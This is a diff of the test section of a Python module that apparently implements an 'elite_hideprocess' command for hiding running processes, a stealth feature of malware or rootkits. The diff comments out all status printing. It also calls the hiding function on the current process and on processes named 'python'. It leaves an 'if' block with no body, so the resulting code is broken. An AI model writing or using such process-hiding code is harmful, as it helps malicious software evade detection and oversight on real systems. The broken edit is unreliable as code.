@@ -517,23 +517,23 @@ def _unix_namespace_hide(pid: int) -> bool:
 
 if __name__ == "__main__":
     # Test the elite_hideprocess command
-    print("Testing Elite HideProcess Command...")
+    # print("Testing Elite HideProcess Command...")
     
     # Test hiding current process
     current_pid = os.getpid()
     result = elite_hideprocess(pid=current_pid, method="auto")
-    print(f"Test 1 - Hide current process: {result['success']}")
+    # print(f"Test 1 - Hide current process: {result['success']}")
     
     if result['success']:
-        print(f"Hidden processes: {result.get('total_hidden', 0)}")
-        print(f"Methods applied: {result.get('methods_applied', [])}")
+    # print(f"Hidden processes: {result.get('total_hidden', 0)}")
+    # print(f"Methods applied: {result.get('methods_applied', [])}")
     
     # Test hiding by process name
     result = elite_hideprocess(process_name="python", method="auto")
-    print(f"Test 2 - Hide by name: {result['success']}")
+    # print(f"Test 2 - Hide by name: {result['success']}")
     
     # Test invalid input
     result = elite_hideprocess()
-    print(f"Test 3 - Invalid input: {result['success']}")
+    # print(f"Test 3 - Invalid input: {result['success']}")
     
-    print("✅ Elite HideProcess command testing complete")
+    # print("✅ Elite HideProcess command testing complete")
